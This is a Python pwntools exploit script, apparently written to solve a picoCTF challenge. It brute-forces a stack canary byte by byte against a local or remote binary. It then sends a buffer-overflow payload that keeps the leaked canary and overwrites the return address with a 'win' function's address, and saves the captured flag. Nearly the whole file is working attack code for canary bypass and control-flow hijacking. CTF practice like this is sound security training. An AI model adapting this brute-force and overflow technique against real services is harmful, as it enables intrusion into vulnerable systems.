#!/bin/python3

import pwn
import re
import coloring
import argparse

parser = argparse.ArgumentParser()

parser.add_argument('target', type=str, choices=['local', 'remote'])
parser.add_argument('--host', type=str)
parser.add_argument('--port', type=int)

args = parser.parse_args()
target = args.target
host = args.host
print(host)
port = args.port
print(port)

pwn.context.log_level = 'critical'

elf = pwn.ELF('./vuln')

winAddr = pwn.pack(elf.symbols['win'], endianness='little')

offset = 64
padding = 16
canary = b''
payload = b''

print('[i] Bruteforcing stack canary...')

while len(canary) < 4:

    for byte in range(255, 0, -1):
        p = pwn.process(
            './vuln') if target == 'local' else pwn.remote(host, port, timeout=2)
        payload = b"".join([
            b'A'*offset,
            canary,
            pwn.p32(byte).split(b'\x00')[0],
        ])

        print(chr(byte))

        # payload = str(len(payload)).encode() + b'\n' + payload

        print(payload)

        # with open('payload', 'wb') as filp:
        #     filp.write(payload)
        payloadSize = str(len(payload)).encode()
        print(payloadSize)
        p.recvline()
        p.sendline(payloadSize)
        p.recvuntil(b'Input>')
        p.sendline(payload)
        p.recv()
        a = p.recvall().decode("latin-1")
        print(a)
        if ("Now Where's the Flag?" in a):
            canary += pwn.p32(byte).split(b'\x00')[0]
            # canary += chr(byte)
            print(b'[+] Found canary ' + canary)
            p.close()
            break
        p.close()

print(coloring.green(f"[!] Leaked canary value : {canary}"))

print('[i] Sending payload...')

p = pwn.process(
    './vuln') if target == 'local' else pwn.connect(host, port)
payload = b"".join([
    b'A'*offset,
    canary,
    b'A'*padding,
    winAddr
])

payloadSize = str(len(payload)).encode()
print(p.recv().decode('utf-8'))
p.sendline(payloadSize)
print(p.recvuntil(b'Input>'))
p.sendline(payload)
a = str(p.recvall().decode("ascii"))

rawFlag = a

flag = re.findall('picoCTF{.*}', rawFlag)[0]

print(coloring.green(f"[!] Found flag : {flag}"))

with open('flag.txt', 'w') as filp:
    filp.write(flag)

p.close()
